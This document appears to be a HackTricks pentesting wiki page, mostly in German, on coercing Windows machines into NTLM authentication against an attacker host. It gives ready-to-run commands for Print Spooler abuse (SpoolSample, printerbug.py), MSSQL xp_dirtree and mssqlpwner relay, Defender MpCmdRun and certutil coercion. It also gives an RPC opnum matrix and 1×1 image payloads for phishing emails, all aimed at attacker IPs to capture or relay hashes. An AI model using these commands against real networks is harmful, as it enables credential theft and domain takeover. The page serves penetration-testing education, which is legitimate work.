# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ist eine **Sammlung** von **remote authentication triggers**, geschrieben in C# unter Verwendung des MIDL compiler, um Drittanbieter-Abhängigkeiten zu vermeiden.

## Spooler Service Abuse

Wenn der _**Print Spooler**_ Dienst **aktiviert** ist, kannst du einige bereits bekannte AD-Anmeldeinformationen verwenden, um dem Printserver des Domain Controllers ein **Update** zu neuen Druckaufträgen zu **request** und ihm einfach zu sagen, die Benachrichtigung an ein beliebiges System zu **send the notification to some system**.\
Beachte, dass wenn der Drucker die Benachrichtigung an ein beliebiges System sendet, er sich gegen dieses **system** **authenticate against** muss. Daher kann ein Angreifer den _**Print Spooler**_ Dienst dazu bringen, sich gegen ein beliebiges System **authenticate against**, und der Dienst wird dabei das **computer account** in dieser **authentication** verwenden.

### Finding Windows Servers on the domain

Verwende PowerShell, um eine Liste von Windows-Rechnern zu erhalten. Server haben in der Regel Priorität, also konzentrieren wir uns darauf:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Feststellen, ob Spooler-Services lauschen

Verwende eine leicht modifizierte Version des [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) von @mysmartlogin (Vincent Le Toux), um zu prüfen, ob der Spooler Service lauscht:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Sie können auch rpcdump.py unter Linux verwenden und nach dem MS-RPRN Protocol suchen.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Den Dienst dazu bringen, sich gegenüber einem beliebigen Host zu authentifizieren

Du kannst [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket) kompilieren.
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
oder benutze [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) oder [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), wenn du unter Linux bist
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Kombination mit Unconstrained Delegation

Wenn ein Angreifer bereits einen Computer mit [Unconstrained Delegation](unconstrained-delegation.md) kompromittiert hat, könnte der Angreifer den Drucker dazu bringen, sich gegenüber diesem Computer zu authentifizieren. Aufgrund der Unconstrained Delegation wird das **TGT** des **Computer-Kontos des Druckers** im **Speicher** des Computers mit Unconstrained Delegation abgelegt. Da der Angreifer diesen Host bereits kompromittiert hat, kann er dieses Ticket **auslesen** und missbrauchen ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / PrintNightmare-family
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Opnum: 0 RpcAsyncOpenPrinter
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Hinweis: Diese Methoden akzeptieren Parameter, die einen UNC-Pfad enthalten können (z. B. `\\attacker\share`). Beim Verarbeiten authentifiziert sich Windows (Maschine/Benutzerkontext) gegenüber diesem UNC, wodurch NetNTLM-Capture oder Relay ermöglicht wird.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

The `PrivExchange` attack is a result of a flaw found in the **Exchange Server `PushSubscription` feature**. This feature allows the Exchange server to be forced by any domain user with a mailbox to authenticate to any client-provided host over HTTP.

By default, the **Exchange service runs as SYSTEM** and is given excessive privileges (specifically, it has **WriteDacl privileges on the domain pre-2019 Cumulative Update**). This flaw can be exploited to enable the **relaying of information to LDAP and subsequently extract the domain NTDS database**. In cases where relaying to LDAP is not possible, this flaw can still be used to relay and authenticate to other hosts within the domain. The successful exploitation of this attack grants immediate access to the Domain Admin with any authenticated domain user account.

## Innerhalb von Windows

Wenn Sie sich bereits auf der Windows-Maschine befinden, können Sie Windows zwingen, mit privilegierten Konten eine Verbindung zu einem Server herzustellen mittels:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oder verwende diese andere Technik: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es ist möglich, das certutil.exe lolbin (von Microsoft signierte Binärdatei) zu verwenden, um NTLM-Authentifizierung zu erzwingen:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Wenn du die **E-Mail-Adresse** des Benutzers kennst, der sich auf einem Rechner einloggt, den du kompromittieren willst, kannst du ihm einfach eine **E-Mail mit einem 1×1-Bild** senden, wie zum Beispiel
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
und wenn er es öffnet, wird er versuchen, sich zu authentifizieren.

### MitM

Wenn du einen MitM-Angriff gegen einen Computer durchführen und HTML in einer Seite injizieren kannst, die er sich anschaut, könntest du versuchen, ein Bild wie das folgende in die Seite einzufügen:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Andere Wege, NTLM-Authentifizierung zu erzwingen und zu phishen


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Wenn du NTLMv1-Challenges erfassen kannst, lies [hier, wie man sie knackt](../ntlm/index.html#ntlmv1-attack).\
_Beachte, dass du, um NTLMv1 zu knacken, die Responder-Challenge auf "1122334455667788" setzen musst_

## Referenzen
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
